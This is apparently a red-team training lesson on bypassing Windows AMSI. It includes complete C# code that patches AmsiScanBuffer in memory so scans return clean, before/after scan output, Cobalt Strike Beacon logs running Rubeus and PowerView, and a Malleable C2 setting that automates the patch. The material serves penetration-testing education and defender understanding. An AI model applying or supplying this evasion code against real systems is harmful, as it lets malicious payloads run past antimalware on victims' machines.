[AmsiScanBuffer](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer) is an API exported from `amsi.dll` - the library that implements the Antimalware Scan Interface (AMSI). Applications, such as PowerShell, will load `amsi.dll` , which you can see in tools such as Process Hacker.

![](https://rto-assets.s3.eu-west-2.amazonaws.com/amsi/amsi-dll.png)

When you type a cmdlet into the PowerShell console or run a script, it will pass the content to AmsiScanBuffer to determine whether or not it's malicious before executing the code. You can validate this behaviour quite easily with [API Monitor](http://www.rohitab.com/).

![](https://rto-assets.s3.eu-west-2.amazonaws.com/amsi/api-monitor.png)


Of course, if the content is deemed malicious, it won't run.

AMSI is integrated into lots of Windows technologies including PowerShell, .NET, the Windows Script Host (`wscript.exe` / `cscript.exe`), JavaScript, VBScript and VBA. This can do a pretty effective job at killing some of Beacon's post-ex commands, including `powershell`, `powerpick`, `psinject` and `execute-assembly`.

```
beacon> run hostname
dc-2

beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1

beacon> powerpick Get-Domain
[*] Tasked beacon to run: Get-Domain (unmanaged)

ERROR: IEX : At line:1 char:1
ERROR: + $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAA ...
ERROR: + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR: This script contains malicious content and has been blocked by your antivirus software.
ERROR: At line:1 char:1
ERROR: + IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:61949 ...
ERROR: + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
ERROR:     + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.Invoke 
ERROR:    ExpressionCommand
ERROR:  

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
[-] Failed to load the assembly w/hr 0x8007000b
```

Let's dig into how AMSI works a bit more. Since it's designed to be implemented by third party applications, we can write a program that will submit samples for scanning.

```csharp
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace ConsoleApp
{
    class Program
    {
        static IntPtr _amsiContext;
        static IntPtr _amsiSession;

        static void Main(string[] args)
        {
            // Initialize the AMSI API.
            AmsiInitialize("Demo App", out _amsiContext);

            // Opens a session within which multiple scan requests can be correlated.
            AmsiOpenSession(_amsiContext, out _amsiSession);

            // Test sample
            var sample = Encoding.UTF8.GetBytes(@"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");

            // Send sample to AMSI
            var result = ScanBuffer(sample);

            Console.WriteLine($"Before patch: {result}");
        }

        static string ScanBuffer(byte[] sample)
        {
            AmsiScanBuffer(_amsiContext, sample, (uint)sample.Length, "Demo Sample", ref _amsiSession, out uint amsiResult);
            return amsiResult >= 32768 ? "AMSI_RESULT_DETECTED" : "AMSI_RESULT_NOT_DETECTED";
        }

        [DllImport("amsi.dll")]
        static extern uint AmsiInitialize(string appName, out IntPtr amsiContext);

        [DllImport("amsi.dll")]
        static extern uint AmsiOpenSession(IntPtr amsiContext, out IntPtr amsiSession);

        // The antimalware provider may return a result between 1 and 32767, inclusive, as an estimated risk level.
        // The larger the result, the riskier it is to continue with the content.
        // Any return result equal to or larger than 32768 is considered malware, and the content should be blocked.
        [DllImport("amsi.dll")]
        static extern uint AmsiScanBuffer(IntPtr amsiContext, byte[] buffer, uint length, string contentName, ref IntPtr amsiSession, out uint scanResult);
    }
}
```
  
This will return the result `AMSI_RESULT_DETECTED` (no surprise for the EICAR test file). This is great for strings, but what about entire programs? Swapping the EICAR string for the Rubeus assembly also returns `AMSI_RESULT_DETECTED`.

```
var sample = File.ReadAllBytes(@"C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe");
```

As we know, `amsi.dll` is loaded into our current process, and has the necessary exports for any application interact with. And because it's loaded into the memory space of a process **we control**, we can change its behaviour by overwriting instructions in memory.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/amsi/exports.png)

  

We need to find the memory address of `AmsiScanBuffer` after `amsi.dll` has been loaded, which we can do with the `GetProcAddress` API.

```csharp
[DllImport("kernel32.dll")]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
```

Get a reference to the modules loaded within the current process and iterate over each one until we find `amsi.dll,` then grab its `BaseAddress`.

```csharp
var modules = Process.GetCurrentProcess().Modules;
var hAmsi = IntPtr.Zero;

foreach (ProcessModule module in modules)
{
    if (module.ModuleName.Equals("amsi.dll"))
    {
        hAmsi = module.BaseAddress;
        break;
    }
}

var asb = GetProcAddress(hAmsi, "AmsiScanBuffer");
```
  

`asb` will then contain a memory address, like`0x00007ff86ffa35e0`. Cross-reference that address in Process Hacker, and you'll see that address is within the main `RX` region of the DLL.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/amsi/asb-region.png)

  

To write new data into this region, the memory permissions need to be changed to allow write access, for which we need the `VirtualProtect` API.

```
[DllImport("kernel32.dll")]
static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
```

But what can we actually overwrite the instructions with? Well, anything you want depending on how you want to modify the behaviour.

Here is one possible method:

If you analyse `amsi.dll` with a solution such as [IDA](https://hex-rays.com/ida-free/), you can see the execution flow of AmsiScanBuffer. Prior to scanning the provided buffer, it will check the parameters that have been supplied to the function - if everything is ok, execution will follow the "red" arrow. Otherwise, there are several branches that lead to a `mov eax, 0x80070057` instruction. This branch then "bypasses" the scanning branch before returning.

`0x80070057` is an [HRESULT](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/705fb797-2175-4a90-b5a3-3918024b10b8) return code for `E_INVALIDARG`.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/amsi/ida-invalidarg.png)

  

One thing we could do is force AmsiScanBuffer to just return a result of `E_INVALIDARG` without actually scanning the content.  So what we need are the CPU opcodes for:

```
mov eax, 0x80070057
ret
```

[This](https://defuse.ca/online-x86-assembler.htm) online x86/x64 assembler is useful for converting assembly to hex.

Make the memory region of `asb` writable, use `Marshal.Copy()` to write then new instructions, and then restore the region back to the original permissions.

```csharp
var patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

// Make region writable (0x40 == PAGE_EXECUTE_READWRITE)
VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out uint oldProtect);

// Copy patch into asb region
Marshal.Copy(patch, 0, asb, patch.Length);

// Restore asb memory permissions
VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out uint _);

// Scan same sample again
result = ScanBuffer(sample);

Console.WriteLine($"After patch: {result}");
```

  

When the same content is scanned a second time, it comes back clean.

```
Before patch: AMSI_RESULT_DETECTED
After patch: AMSI_RESULT_NOT_DETECTED
```

This is great, but how can we integrate it into Cobalt Strike's workflow? There's actually a Malleable C2 directive called `amsi_disable` that will automate all this for us!

The **Malleable Command & Control** section goes into more depth on specifically what Malleable C2 is and how to customise it. To enable the `amsi_disable` directive, add the following to your profile:

```
post-ex {
    set amsi_disable "true";
}
```

This will tell Beacon to patch the AmsiScanBuffer function for `powerpick`, `execute-assembly` and `psinject` commands.

```
beacon> run hostname
dc-2

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage

Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x3e3735
[...snip...]
```

Knowing how to bypass AMSI manually is still useful in cases where you need to deploy your own payloads outside of Cobalt Strike and other C2 frameworks (for example, initial compromise payloads).